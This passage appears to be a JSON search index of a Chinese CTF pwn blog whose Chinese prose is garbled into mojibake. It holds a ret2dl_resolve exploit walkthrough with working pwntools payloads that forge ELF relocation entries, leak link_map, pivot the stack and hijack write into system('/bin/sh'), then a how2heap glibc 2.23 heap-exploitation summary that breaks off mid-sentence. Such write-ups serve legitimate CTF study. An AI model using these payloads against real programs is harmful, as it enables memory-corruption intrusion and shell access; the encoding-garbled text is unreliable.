relplt_addrï¼Œé‚£ä¹ˆç›¸åŠ ä¹‹åå°±å¯ä»¥ç›´è¾¾æˆ‘ä»¬è®¾ç½®çš„fake_ELF32_Relç»“æ„ä½“ä½ç½®ã€‚\n\nâ‘¡st_name_addrä½œç”¨ï¼šä½œä¸ºåç§»å€¼ï¼Œä¸dynstr_addrç›¸åŠ å¾—åˆ°å­˜æ”¾å‡½æ•°åçš„åœ°å€ã€‚å¦‚æœæŒ‰ç…§åŸæœ¬çš„é‡å®šä½ï¼Œé‚£ä¹ˆæ­¤å¤„è®¡ç®—ä¹‹åå­˜æ”¾çš„åº”è¯¥æ˜¯writeï¼Œæ‰€ä»¥è¿™é‡Œå°†å…¶æ”¹ä¸ºsystemï¼Œæ”¾åœ¨æ‰€æœ‰æ•°æ®çš„æœ€åé¢ï¼Œå°†åœ°å€å­˜æ”¾åˆ°fake_Elf32_Symç»“æ„ä½“ä¸­ï¼Œè®¾ç½®ä¸ºfake_st_name_addr = new_stack_addr + 0x6c - dynstr_addrï¼Œè¿™æ ·ç›¸åŠ ä¹‹åå°±ä¼šå®šä½åˆ°new_stack_addr + 0x6cï¼Œå³æˆ‘ä»¬åŠ«æŒæ ˆä¸Šçš„systemå­—ç¬¦ä¸²åœ°å€å¤„ï¼Œä»è€ŒåŠ«æŒè£…è½½ã€‚\n\nâ‘¢r_infoä½œç”¨ï¼šä½œä¸ºåç§»å€¼ï¼Œä½¿å¾—ç»“æ„ä½“æ•°ç»„Elf32_Sym[r_info>>8]æ¥æ‰¾åˆ°å­˜æ”¾writeçš„ç»“æ„ä½“Elf32_Symã€‚æˆ‘ä»¬çŸ¥é“ç»“æ„ä½“æ•°ç»„å¯»å€æ–¹å¼å…¶å®å°±æ˜¯addr = head_addr + size*indxï¼Œä¹Ÿå°±æ˜¯é¦–åœ°å€åŠ ä¸Šæ•°ç»„ä¸­å…ƒç´ å¤§å°ä¹˜ä»¥ç´¢å¼•ã€‚è¿™é‡Œç”±äºä¼ªé€ äº†Elf32_Symç»“æ„ä½“ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„r_info>>8 = indxåº”è¯¥æ˜¯addr - head_addr/sizeï¼Œå¯¹åº”çš„å°±æ˜¯(fake_Elf32_Sym_addr - dynsym_addr)/0x10ï¼Œå¾—åˆ°æœ€ç»ˆçš„r_infoä¸º((fake_Elf32_Sym_addr - dynsym_addr)/0x10)<<8ã€‚\n\nâ‘£è®¾ç½®writeçš„Elf32_Symç»“æ„ä½“æ—¶ï¼Œå¯ä»¥é€šè¿‡å‘½ä»¤readelf -r binaryï¼Œæ‰¾åˆ°writeçš„r_infoåç§»ä¸º407ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516168.jpeg)\n\nä¹‹åè¾“å…¥objdump -s -j .dynsym level3ï¼ŒæŸ¥æ‰¾åç§»ä¸º4çš„Elf32_Symç»“æ„ä½“å†…å®¹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516927.jpeg)\n\nè¿™é‡Œå°±æ˜¯0x804820cï¼Œå¯¹åº”çš„å†…å®¹ä¸ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n\nst_name = 31000000\nst_value = 00000000\nst_size = 00000000\nst_info = 12\nst_other = 00\nst_shndx = 0000\n```\n\nâ–²å…¶å®åœ¨IDAä¸­çœ‹çš„æ›´æ¸…æ¥šï¼š![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516336.jpeg)\n\nåŒæ—¶ç”±äºæœå¯»æ•°æ®æ—¶ï¼Œéœ€è¦æŸ¥æ‰¾ç±»å‹R_386_JUMP_SLOTï¼Œè¯¥ç´¢å¼•ä¸ºr_infoçš„æœ€åä¸€ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥éœ€è¦å°†r_infoçš„æœ€åä¸€ä¸ªå­—èŠ‚è®¾ç½®ä¸º0x07ï¼Œæ¥é€šè¿‡æ£€æŸ¥ã€‚\n\nâ–²ä»¥ä¸‹ä¸ºä¸¤ä¸ªç»“æ„ä½“å†…å®¹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n#Elf32_Relç»“æ„ä½“ï¼šå¤§å°ä¸º0x08\ntypedef struct {\n    Elf32_Addr r_offset;   // å¯¹äºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ­¤å€¼ä¸ºè™šæ‹Ÿåœ°å€\n    Elf32_Word r_info;     // ç¬¦å·è¡¨ç´¢å¼•\n} Elf32_Rel;\n\n\n#Elf32_Symç»“æ„ä½“ï¼šå¤§å°ä¸º0x10\ntypedef struct\n{\n    Elf32_Word st_name;      // Symbol name(string tbl index)\n    Elf32_Addr st_value;     // Symbol value\n    Elf32_Word st_size;      // Symbol size\n    unsigned char st_info;   // Symbol type and binding\n    unsigned char st_other;  // Symbol visibility under glibc>=2.2\n    Elf32_Section st_shndx;  // Section index\n} Elf32_Sym;\n```\n\n(4)å°†ä¼ªé€ çš„ç»“æ„ä½“å’Œå¿…è¦æ•°æ®æ”¾åœ¨bssæ–°æ ˆä¸Šï¼Œä»plt0_addrå¼€å§‹æ‰§è¡Œï¼Œè°ƒç”¨writeå‡½æ•°ï¼Œé‡æ–°è£…è½½writeå‡½æ•°ï¼ŒåŠ«æŒæˆsystemå‡½æ•°ï¼ŒåŒæ—¶ä¿®æ”¹å‚æ•°ä¸ºbinshï¼Œç›´æ¥getshellã€‚\n\n```\n#æ³¨é‡Šå¤´\n\n#æ‰§è¡Œæ•°æ®ï¼š\npayload = \"\"\npayload += \"AAAA\"              #ä½äºnew_stack_addr,å ä½ç”¨äºpop ebp\npayload += p32(plt0_addr)      #ä½äºnew_stack_addr+0x04,è°ƒç”¨PLT[0]\npayload += p32(fake_reloc_arg) #ä½äºnew_stack_addr+0x08,ä¼ å…¥ä¼ªé€ çš„reloc_arg\npayload += p32(0)              #ä½äºnew_stack_addr+0x0c,systemå‡½æ•°è¿”å›å€¼\npayload += p32(binsh_addr)     #ä½äºnew_stack_addr+0x10,ä¿®æ”¹å‚æ•°ä¸º/bin/shå­—ç¬¦ä¸²åœ°å€\n\n#ä¼ªé€ çš„å†…å®¹æ•°æ®ï¼š\npayload += \"A\"*0x3c            #ä½äºnew_stack_addr+0x14,padding\npayload += fake_Elf32_Rel_data #ä½äºnew_stack_addr+0x50,Elf32_Relç»“æ„ä½“\npayload += \"AAAA\"              #ä½äºnew_stack_addr+0x58ï¼Œpadding\npayload += fake_Elf32_Sym_data #ä½äºnew_stack_addr+0x5c,Elf32_Symç»“æ„ä½“\npayload += \"system\\x00\\x00\"    #ä½äºnew_stack_addr+0x6c,ä¼ å…¥systemå‡½æ•°å\npayload += \"/bin/sh\\x00\"       #ä½äºnew_stack_addr+0x74,ä¼ å…¥binshå­—ç¬¦ä¸²\n\nio.send(payload)\nio.interactive()\n```\n\nâ–²ä¸åŒç‰ˆæœ¬çš„libcä¹Ÿä¸å¤ªä¸€æ ·ï¼Œåœ¨libc2.27åŠä»¥ä¸‹è¯•è¿‡éƒ½è¡Œï¼Œä½†2.30åŠä»¥ä¸Šå¥½åƒå°±ä¸å¯ä»¥ï¼Œå¯èƒ½ç‰ˆæœ¬æ”¹äº†å¤šäº†ä¸€äº›æ£€æŸ¥å§ã€‚\n\n \n\näºŒã€64ä½ç¨‹åºï¼š\n\n1.å®Œå…¨ä¸€æ ·ï¼Œåªæ˜¯ç¨‹åºæ”¹æˆäº†64ä½ï¼Œåœ¨64ä½æ¡ä»¶ä¸‹æœ‰äº›å‘ç”Ÿäº†å˜åŒ–ï¼š\n\n(1)ä¸¤å¤§ç»“æ„ä½“å‘ç”Ÿå˜åŒ–ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n#Elf64_Relaç»“æ„ä½“ï¼šå¤§å°ä¸º0x18\ntypedef struct\n{\n  Elf64_Addr  r_offset;          /(0x08)* Address */\n  Elf64_Xword  r_info;           /(0x08)* Relocation type and symbol index */\n  Elf64_Sxword  r_addend;        /(0x08)* Addend */\n} Elf64_Rela;\n\n#Elf64_Symç»“æ„ä½“ï¼šå¤§å°ä¸º0x18\ntypedef struct\n{\n  Elf64_Word  st_name;           /(0x04)* Symbol name (string tbl index) */\n  unsigned char  st_info;        /(0x01)* Symbol type and binding */\n  unsigned char  st_other;       /(0x01)* Symbol visibility */\n  Elf64_Section  st_shndx;       /(0x02)* Section index */\n  Elf64_Addr  st_value;          /(0x08)* Symbol value */\n  Elf64_Xword  st_size;          /(0x08)* Symbol size */\n} Elf64_Sym;\n```\n\n![elf64_rel](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516705.png)\n\n![elf64_sym](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516393.png)\n\n(2)å¯»å€æ–¹å¼å‘ç”Ÿå˜åŒ–ï¼Œä¸å†æ˜¯ç›´æ¥å¯»å€ï¼Œè€Œæ˜¯é€šè¿‡ä¸€ä¸ªæ•°ç»„å¯»å€ï¼Œå¹¶ä¸”å¦‚æœç´¢å¼•è¿‡å¤§ï¼Œä¼šé€ æˆæ•°ç»„è¶Šç•Œï¼Œç¨‹åºå´©æºƒã€‚è¿™é‡Œå°±éœ€è¦è®¾ç½®link_mapé‡Œçš„æŸäº›å‚æ•°ï¼Œç½®ä¸º0ï¼Œæ‰èƒ½è·³è¿‡å…¶ä¸­çš„åˆ¤æ–­è¯­å¥ï¼Œä½¿å¾—ä¼ªé€ çš„r_infoèƒ½å¤Ÿèµ·ä½œç”¨ï¼Œæ‰€ä»¥è¿™é‡Œè¿˜éœ€è¦å…ˆæ³„éœ²link_mapçš„åœ°å€ï¼š(æˆ–è€…ç›´æ¥ä¼ªé€ link_map)\n\nâ–² GOT+4(å³GOT[1])ä¸ºåŠ¨æ€åº“æ˜ å°„ä¿¡æ¯æ•°æ®ç»“æ„link_map åœ°å€ï¼›GOT+8(å³GOT[2])ä¸ºåŠ¨æ€é“¾æ¥å™¨ç¬¦å·è§£æå‡½æ•°çš„åœ°å€_dl_runtime_resolveã€‚\n\n(3)åŒæ—¶ç”±äºé€šè¿‡æ•°ç»„ç´¢å¼•ï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œ0x18çš„å¯¹é½ï¼Œç¡®ä¿é€šè¿‡ç´¢å¼•n*0x18åˆ°çš„åœ°å€æ˜¯æˆ‘ä»¬ä¼ªé€ çš„ç»“æ„ä½“ã€‚\n\n2.æ€è€ƒexpç¼–å†™ï¼š\n\n(1)å„ç§å‰ç½®åœ°å€ï¼š\n\n```\nvulfun_addr = 0x4005e6\nwrite_got = 0x600A58\nread_got = 0x600A60\nplt0_addr = 0x4004a0\nlink_map_got = 0x600A48\n#GOT[1]çš„åœ°å€\nleave_ret = 0x400618\npop_rdi_ret = 0x4006b3\npop_rbp_ret = 0x400550\n\nnew_stack_addr = 0x600d88 \n#ç¨‹åºè¿è¡Œèµ·æ¥æ‰ä¼šæœ‰ï¼Œbssä¸gotè¡¨ç›¸é‚»ï¼Œ_dl_fixupä¸­ä¼šé™ä½æ ˆåä¼ å‚ï¼Œè®¾ç½®ç¦»bssé¦–åœ°å€è¿œä¸€ç‚¹é˜²æ­¢å‚æ•°å†™å…¥éæ³•åœ°å€å‡ºé”™\n\nrelplt_addr = 0x400420 \n#.rel.pltçš„é¦–åœ°å€ï¼Œé€šè¿‡è®¡ç®—é¦–åœ°å€å’Œæ–°æ ˆä¸Šæˆ‘ä»¬ä¼ªé€ çš„ç»“æ„ä½“Elf64_Relaåç§»æ„é€ reloc_arg\n\ndynsym_addr = 0x400280\n#.dynsymçš„é¦–åœ°å€ï¼Œé€šè¿‡è®¡ç®—é¦–åœ°å€å’Œæ–°æ ˆä¸Šæˆ‘ä»¬ä¼ªé€ çš„Elf64_Symç»“æ„ä½“åç§»æ„é€ Elf64_Rela.r_info\n\ndynstr_addr = 0x400340\n#.dynstrçš„é¦–åœ°å€ï¼Œé€šè¿‡è®¡ç®—é¦–åœ°å€å’Œæ–°æ ˆä¸Šæˆ‘ä»¬ä¼ªé€ çš„å‡½æ•°åå­—ç¬¦ä¸²systemåç§»æ„é€ Elf64_Sym.st_name\n```\n\n(2)æ³„éœ²link_mapçš„åœ°å€:\n\n```\n#æ³¨é‡Šå¤´\n\nuniversal_gadget1 = 0x4006aa\t\n#pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; retn\nuniversal_gadget2 = 0x400690\t\n#mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*8]\n\n#ä½¿ç”¨ä¸‡èƒ½gadgetsè°ƒç”¨writeæ³„éœ²link_mapåœ°å€\npayload = \"\"\npayload += 'A'*136 #padding\npayload += p64(universal_gadget1) \npayload += p64(0x0)\npayload += p64(0x1) #rbpï¼Œéšä¾¿è®¾ç½®\npayload += p64(write_got)\npayload += p64(0x8)\npayload += p64(link_map_got)\npayload += p64(0x1)\npayload += p64(universal_gadget2)\npayload += 'A'*0x38 #æ ˆä¿®æ­£\npayload += p64(vulfun_addr) #è¿”å›åˆ°vulnerable_functionå¤„\n\nio.send(payload)\nio.recvuntil(\"Input:\\n\")\nlink_map_addr = u64(io.recv(8))\nlog.info(\"Leak link_map address:%#x\" %(link_map_addr))\n```\n\n(3)è¿›è¡Œæ ˆåŠ«æŒï¼š\n\n```\n#æ³¨é‡Šå¤´\n\npayload = \"\"\npayload += 'A'*136 #padding\npayload += p64(universal_gadget1) \npayload += p64(0x0)\npayload += p64(0x1)\npayload += p64(read_got) #ä½¿ç”¨ä¸‡èƒ½gadgetsè°ƒç”¨readå‘æ–°æ ˆä¸­å†™å…¥æ•°æ®\npayload += p64(0x500)\npayload += p64(new_stack_addr)\npayload += p64(0x0)\npayload += p64(universal_gadget2)\npayload += 'A'*0x38 #æ ˆä¿®æ­£\n\npayload += p64(pop_rbp_ret) \n#è¿”å›åˆ°pop rbp; retnï¼ŒåŠ«æŒæ ˆã€‚æ­¤å¤„ç›´æ¥åŠ«æŒæ ˆæ˜¯å› ä¸ºå¦‚æœç»§ç»­ä¿®æ”¹link_map+0x1c8ä¼šå¯¼è‡´ROPé“¾è¿‡é•¿ï¼Œæ ˆä¸Šçš„ç¯å¢ƒå˜é‡æŒ‡é’ˆè¢«ç ´åï¼Œä»è€Œå¯¼è‡´systemå¤±è´¥ã€‚\npayload += p64(new_stack_addr)\npayload += p64(leave_ret)\n\nio.send(payload)\n```\n\n(4)ä¼ªé€ ä¸¤å¤§ç»“æ„ä½“å’Œå¿…è¦æ•°æ®ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nfake_Elf64_Rela_base_addr = new_stack_addr + 0x150 \n#æ–°æ ˆä¸Šé€‰æ‹©ä¸€å—åœ°å€ä½œä¸ºä¼ªé€ çš„Elf64_Relaç»“æ„ä½“åŸºå€ï¼Œç¨åè¿˜è¦é€šè¿‡è®¡ç®—è¿›è¡Œ0x18å­—èŠ‚å¯¹é½\n\nfake_Elf64_Sym_base_addr = new_stack_addr + 0x190\n#æ–°æ ˆä¸Šé€‰æ‹©ä¸€å—åœ°å€ä½œä¸ºä¼ªé€ çš„Elf64_Symç»“æ„ä½“åŸºå€ï¼Œç¨åè¿˜è¦é€šè¿‡è®¡ç®—è¿›è¡Œ0x18å­—èŠ‚å¯¹é½ï¼Œä¸ä¸Šä¸€ä¸ªç»“æ„ä½“ä¹‹é—´ç•™å‡ºä¸€æ®µé•¿åº¦é˜²æ­¢é‡å \n\nfake_st_name = new_stack_addr + 0x1c0 - dynstr_addr \n#è®¡ç®—ä¼ªé€ çš„st_nameæ•°å€¼ï¼Œä¸ºä¼ªé€ å‡½æ•°å­—ç¬¦ä¸²systemä¸.dynstrèŠ‚å¼€å¤´é—´çš„åç§»\n\nbinsh_addr = new_stack_addr + 0x1c8 \n#\"/bin/sh\\x00\"æ‰€åœ¨åœ°å€ï¼Œè®¡ç®—å¾—åˆ°çš„\n\n#è®¡ç®—ä¸¤ä¸ªç»“æ„ä½“çš„å¯¹é½å¡«å……å­—èŠ‚æ•°ï¼Œä¸¤ä¸ªç»“æ„ä½“å¤§å°éƒ½æ˜¯0x18\nrel_plt_align = 0x18 - (fake_Elf64_Rela_base_addr - relplt_addr) % 0x18 \nrel_sym_align = 0x18 - (fake_Elf64_Sym_base_addr - dynsym_addr) % 0x18\n\n#åŠ ä¸Šå¯¹é½å€¼åä¸ºç»“æ„ä½“çœŸæ­£åœ°å€\nfake_Elf64_Rela_addr = fake_Elf64_Rela_base_addr + rel_plt_align \nfake_Elf64_Sym_addr = fake_Elf64_Sym_base_addr + rel_sym_align\n\nfake_reloc_arg = (fake_Elf64_Rela_addr - relplt_addr)/0x18 \n#è®¡ç®—ä¼ªé€ çš„reloc_argï¼Œç”±äºæ˜¯æ•°ç»„ç´¢å¼•ä¸‹æ ‡ï¼Œæ‰€ä»¥éœ€è¦é™¤ä»¥ç»“æ„ä½“å¤§å°0x18\n\nfake_r_info = (((fake_Elf64_Sym_addr - dynsym_addr)/0x18) << 0x20) | 0x7 \n#ä¼ªé€ r_infoï¼Œåç§»è¦è®¡ç®—æˆä¸‹æ ‡ï¼Œé™¤ä»¥Elf64_Symçš„å¤§å°ï¼Œæœ€åä¸€å­—èŠ‚ä¸º0x7\n\n\nfake_Elf64_Rela_data = \"\"\nfake_Elf64_Rela_data += p64(write_got) \n#r_offset = write_gotï¼Œä»¥å…é‡å®šä½å®Œæ¯•å›å¡«gotè¡¨çš„æ—¶å€™å‡ºç°éæ³•å†…å­˜è®¿é—®é”™è¯¯\nfake_Elf64_Rela_data += p64(fake_r_info)\nfake_Elf64_Rela_data += p64(0)\n\nfake_Elf64_Sym_data = \"\"\nfake_Elf64_Sym_data += p32(fake_st_name)\nfake_Elf64_Sym_data += p8(0x12)\n#åé¢çš„æ•°æ®ç›´æ¥å¥—ç”¨writeå‡½æ•°çš„Elf64_Symç»“æ„ä½“ï¼Œè¿™é‡Œè¦æ³¨æ„æ•°æ®å¤§å°\nfake_Elf64_Sym_data += p8(0)\nfake_Elf64_Sym_data += p16(0)\nfake_Elf64_Sym_data += p64(0)\nfake_Elf64_Sym_data += p64(0)\n```\n\n(5)å°†link_map+0x1c8ç½®0ä¹‹åï¼Œç›´æ¥å†æ¬¡é‡å®šä½writeå‡½æ•°ï¼ŒåŠ«æŒä¸ºsystemå‡½æ•°ï¼Œgetshell:\n\n```\n#æ³¨é‡Šå¤´\n\n#ä½¿ç”¨ä¸‡èƒ½gadgetsè°ƒç”¨readæŠŠlink_map+0x1c8ç½®ä¸º0\npayload = \"\"\npayload += \"AAAAAAAA\"\npayload += p64(universal_gadget1)\npayload += p64(0x0)\npayload += p64(0x1) #rbpè®¾ç½®ä¸º1\npayload += p64(read_got)\npayload += p64(0x8)\npayload += p64(link_map_addr + 0x1c8)\npayload += p64(0x0)\npayload += p64(universal_gadget2)\npayload += 'A'*0x38 #æ ˆä¿®æ­£\n\n#ä¸ºsystemå‡½æ•°è®¾ç½®å‚æ•°\"/bin/sh\\x00\"ï¼Œç”±äºplt[0]å‡½æ•°è°ƒç”¨é‡å®šä½å–å‚ä»ç„¶æ˜¯ä»æ ˆä¸Šå–ï¼Œä¸ä¼šç”¨åˆ°rdiå¯„å­˜å™¨ä¼ å‚ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥å…ˆä¼ å‚ä¹Ÿå¯ã€‚\npayload += p64(pop_rdi_ret) \npayload += p64(binsh_addr)\n\npayload += p64(plt0_addr)\npayload += p64(fake_reloc_arg)\npayload = payload.ljust(0x150, \"A\") #padding\n\npayload += 'A'*rel_plt_align\npayload += fake_Elf64_Rela_data\npayload = payload.ljust(0x190, \"A\") #padding\n\npayload += 'A'*rel_sym_align\npayload += fake_Elf64_Sym_data\npayload = payload.ljust(0x1c0, \"A\") #padding\npayload += \"system\\x00\\x00\"\npayload += \"/bin/sh\\x00\"\n\nio.send(payload) #å†™å…¥è¯¥æ®µpayload,å°†æ•°æ®è¯»å–åˆ°æ–°æ ˆ\nio.send(p64(0)) #æ‰§è¡Œæ–°æ ˆä¸Šçš„ç›¸å…³ä»£ç ï¼Œè®¾ç½®link_map+0x1c8ä¸º0ã€‚\n\nio.interactive()\n```\n\nâ–²å…¶å®è¿˜æ˜¯ä¸€çŸ¥åŠè§£ï¼Œç­‰å…ˆæ‰“å®ŒåŸºç¡€å†æ¥æ·±ç©¶å§ã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://wiki.x10sec.org/pwn/linux/stackoverflow/advanced-rop-zh/\n\nhttps://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=44816&ctid=157\n\nhttps://syst3mfailure.github.io/ret2dl_resolve\n\nhttps://xz.aliyun.com/t/5722\n","tags":["First"],"categories":["PWN","RROP0xa"]},{"title":"how2heap_libc2.23_summary","url":"/2021/08/14/how2heap_libc2.23_summary/","content":"\n1.first_fit:\n\nunsortedbinä¸­åˆ‡å‰²åŸåˆ™ï¼Œå¸¸ç”¨æ¥æ³„éœ²åœ°å€\n\n \n\n2.fastbin_dupï¼š\n\n```\n#æ³¨é‡Šå¤´\n\na=malloc(x),b=malloc(x),c=mallox(x)\nfree(a),free(b),free(a)\nmalloc(x)=a,malloc(x)=b,malloc(x)=a\n```\n\n \n\n3.fastbin_dup_into_stack:\n\n```\n#æ³¨é‡Šå¤´\n\na=malloc(x),b=malloc(x),c=mallox(x)\nfree(a),free(b),free(a)\n\n//malloc(x)å¾—åˆ°aï¼Œæ­¤æ—¶aè¿˜åœ¨fastbinä¸­ï¼Œä¹‹åä¿®æ”¹açš„fdä¸ºfakechunkï¼Œä½¿å¾—:\nfastbinsY.fd->b,b.fd->a,a.fd->fakechunk\n\n//å†æ¬¡ç”³è¯·å¾—åˆ°fakechunk\nmalloc(x)=b,malloc(x)=a,malloc(x)=fakechunk\n//è¿™é‡Œå°±å¯ä»¥ä½¿å¾—fakechunkä½äºæ ˆä¸Šï¼Œä»è€Œä½¿å¾—å †åˆ†é…åˆ°æ ˆä¸­æ§åˆ¶æ ˆä¸Šçš„åŸå…ˆä¸å¯æ§æ•°æ®ã€‚\n```\n\n \n\n4.fastbin_dup_consolidate\n\n```\n#æ³¨é‡Šå¤´\n\na=malloc(x),b=malloc(x)\nfree(a)//aè¿›å…¥fastbinä¸­\n\nc = malloc(0x400)\n//ç”³è¯·large binçš„æ—¶å€™å·²ç»æ‰§è¡Œäº†malloc_consolidateï¼Œä½¿å¾—fastbinä¸­çš„aæ”¾å…¥smallbinä¸­\n\nfree(a)\n//å¹¶ä¸ä¼šæŠ¥é”™,å› ä¸ºè¿™ä¸ªæ—¶å€™aå·²ç»è¢«æ”¾åˆ°äº†smallbinä¹‹ä¸­,fastbinä¸­æ²¡æœ‰a,ä¹‹åaå†æ¬¡è¿›å…¥fastbinä¸­\n\n//æ­¤æ—¶çš„aä¸­ä¿¡æ¯å¦‚ä¸‹ï¼š\na.bk->smallbin\na.fd->0//ç”±äºå¤„åœ¨fastbinçš„ç¬¬ä¸€ä¸ªï¼Œæ‰€ä»¥fdè¢«æ¸…ç©º\n\nmalloc(x) = a//è¿™æ—¶å€™aä¸­å­˜åœ¨smallbinçš„ä¿¡æ¯ï¼Œå¯ä»¥è¿›è¡Œæ³„éœ²\nmalloc(x) = a//å¯ä»¥å†æ¬¡ç”³è¯·ï¼Œå†æ¬¡å¾—åˆ°a\n```\n\n \n\n5.house_of_einherjarï¼š\n\nåœ¨å½“å‰chunkä¸­æ„é€ fakechunkï¼Œåˆ©ç”¨æº¢å‡ºæ¼æ´ä¿®æ”¹ä¸‹ä¸€ä¸ªchunkçš„presizeå’Œpre_inuseã€‚ä¹‹åé‡Šæ”¾ä¸‹ä¸€ä¸ªchunkè¿ä¸Šfakechunkä¸€èµ·è¿›å…¥Binsä¸­ï¼Œå†é€šè¿‡å½“å‰chunkä¿®æ”¹è¿›å…¥binsä¸­chunkçš„fd,bkï¼Œä»è€Œå®ç°ä»»æ„åœ°å€è¯»å†™ã€‚\n\n(1)ç”³è¯·ä¸‰ä¸ªchunkï¼Œchunk1,chunk2,chunk3\n\n(2)åœ¨chunk1ä¸­åˆ¶é€ fakechunk//è¿™é‡Œéœ€è¦ç»•è¿‡ä¸€äº›æ£€æŸ¥\n\nâ‘ æ„é€ ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nfake_chunk->size = sizeof(chunk1)-0x10\n```\n\nç»•è¿‡pre_sizeçš„æ£€æŸ¥ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nif (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))     \n      malloc_printerr (\"corrupted size vs. prev_size\");\n```\n\nè¿™æ®µä»£ç æ„æ€å°±æ˜¯å½“å‰chunkçš„sizeå¦‚æœä¸ç­‰äºä¸‹ä¸€ä¸ªchunkçš„pre_sizeåŸŸï¼Œåˆ™å‡ºé”™\n\nâ‘¡æ„é€ ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nfake_chunk->fd = chunk1\nfake_chunk->bk = chunk1\n```\n\nç»•è¿‡åŒå‘é“¾è¡¨çš„æ£€æŸ¥ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nif (__builtin_expect (FD->bk != P || BK->fd != P, 0))      \n      malloc_printerr (\"corrupted double-linked list\");\n```\n\nè¿™æ®µä»£ç æ„æ€å°±æ˜¯ä¸‹ä¸€ä¸ªchunkï¼Œä¹Ÿå°±æ˜¯BKï¼Œå…¶fdä¸ç­‰äºå½“å‰chunkåœ°å€ï¼Œæˆ–è€…ä¸Šä¸€ä¸ªchunkï¼Œä¹Ÿå°±æ˜¯FDï¼Œå…¶bkä¸ç­‰äºå½“å‰chunkåœ°å€ï¼Œæ»¡è¶³å…¶ä¸­ä¸€ä¸ªå°±å‡ºé”™ã€‚\n\n(3)åˆ©ç”¨æº¢å‡ºæ¼æ´ï¼Œæ”¹æ‰chunk2çš„pre_sizeå’Œpre_inuseï¼Œfreeæ‰chunk2,è¿™æ ·fakechunk+chunk2ä¸€èµ·è¢«æ”¾å…¥binsä¸­ï¼Œå½¢æˆchunkA\n\n(4)é€šè¿‡chunk1ä¿®æ”¹chunkAçš„fd,bkï¼Œä½¿å…¶æŒ‡å‘æƒ³æ›´æ”¹çš„åœ°å€addr\n\n(5)å†malloc(sizeof(fakechunk+chunk2))å°±å¯ä»¥å¾—åˆ°é¦–åœ°å€ä¸ºfakechunkï¼Œå¤§å°ä¸ºfakechunk+chunk2çš„chunkAäº†ã€‚ä¹‹åå†mallocä¸€æ¬¡å°±å¾—åˆ°addrçš„chunk\n\n \n\n6.house_of_forceï¼šé€šè¿‡ä¿®æ”¹topchunkçš„sizeåŸŸè·å¾—ä»»æ„è¯»å†™çš„chunk\n\n(1)ä¿®æ”¹topchunkçš„sizeåŸŸï¼Œä½¿ä¹‹å˜æˆä¸€ä¸ªå¤§æ•°ã€‚\n\n(2)malloc(-size)ã€‚è¦ç¡®ä¿è¿™ä¸ª-size<topchunk.size(è¡¥ç å½¢å¼)\n\n(3)ä¹‹åtopchunkå°±ä¼šè¢«æŠ¬å‡åˆ°-(size-0x10)çš„ä½ç½®(chunkå†…å­˜å¯¹é½çš„åŸå› ï¼Œå…·ä½“è°ƒè¯•ä¸€ä¸‹å°±èƒ½åˆ¤æ–­è¢«æŠ¬å‡åˆ°å“ªé‡Œäº†ï¼šp main_arena.top)ç„¶åæ‰ä¼šä»è¢«æŠ¬å‡ä¹‹åçš„topchunkå¼€å§‹åˆ†é…sizeå¤§å°çš„chunkã€‚\n\n(4)è¿™æ—¶å€™å†æ­£å¸¸mallocï¼Œå°±å¯åˆ†é…åˆ°ä»è¢«æŠ¬å‡ä¹‹ååˆ†é…å®Œsizeçš„topchunkåœ°å€å¤„åˆ‡å‰²çš„chunkäº†ï¼Œå®ç°ä»»æ„åœ°å€è¯»å†™ã€‚\n\n \n\n7.house_of_loreï¼š\n\né’ˆå¯¹small binè¿›è¡Œæ”»å‡»çš„ï¼Œå¦‚æœé¢˜ç›®è®¾ç½®mallocå¤§å°é™åˆ¶å¤§äºfastbinæ—¶ï¼Œå°±å¯ä»¥åˆ©ç”¨äº†ã€‚\n\n(1)åˆ†é…ä¸€ä¸ªsmall binå¤§å°çš„chunk_ptrï¼Œå’Œå¦ä¸€ä¸ªchunk ç”¨æ¥é—´éš” top chunkã€‚\n\n(2)åœ¨æ ˆä¸Šä¼ªé€ ä¸¤ä¸ªåœ°å€fake chunk1å’Œfake chunk2ï¼Œä»smallbinä¸­ç”³è¯·éœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š\n\nâ‘ // è·å– small bin ä¸­å€’æ•°ç¬¬äºŒä¸ª chunk ã€‚\n\nbck = victim->bk;\n\nâ–²éœ€è¦è®¾ç½®chunk_ptr->bk = fake chunk1\n\nâ‘¡// æ£€æŸ¥ bck->fd æ˜¯ä¸æ˜¯ victimï¼Œé˜²æ­¢ä¼ªé€ \n\n```\n#æ³¨é‡Šå¤´\n\nif (__glibc_unlikely(bck->fd != victim)) {\n     errstr = \"malloc(): smallbin double linked list corrupted\";\n     goto errout;\n}\n```\n\nâ–²éœ€è¦è®¾ç½®fake chunk1->fd = chunk_ptrï¼ŒåŒæ—¶ç”±äºä¹‹åç”³è¯·fake chunk1æ—¶ä¹Ÿéœ€è¦æ»¡è¶³è¿™ä¸ªæ¡ä»¶ï¼Œæ‰€ä»¥ä¹Ÿéœ€è¦è®¾ç½®fake chunk2->fd = fake chunk1ï¼Œfake chunk1->bk = fake chunk2\n\n(3)é‡Šæ”¾æ‰chunk_ptrï¼Œå”¯ä¸€éœ€è¦æ¼æ´åˆ©ç”¨çš„æ˜¯è®¾ç½®victim->bk = fake 